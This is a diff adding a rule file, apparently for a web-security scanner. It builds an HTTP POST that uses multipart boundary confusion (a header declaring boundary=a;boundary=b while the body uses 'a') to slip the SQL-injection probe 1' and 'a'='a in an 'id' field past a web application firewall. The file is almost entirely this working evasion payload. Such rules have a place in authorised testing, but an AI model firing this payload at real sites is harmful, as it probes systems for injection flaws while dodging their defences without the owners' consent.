@@ -1,0 +1,21 @@
+# @name: do9gy的宝藏规则multi-边界混淆
+# @tags: post,multipart,form-data,multi-boundary,id,bypass
+# @color: yellow
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_double_boundary
+# @intent.param: id
+# @intent.payload: 1' and 'a'='a
+# @intent.header_boundary: a;boundary=b
+# @intent.body_boundary: a
+# @note: 参考 POST Multipart探测，将 Content-Type 设置为 multipart/form-data;boundary=a;boundary=b;，并在 body 中使用 a 作为 boundary。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data;boundary=a;boundary=b;
+
+--a
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+--a--
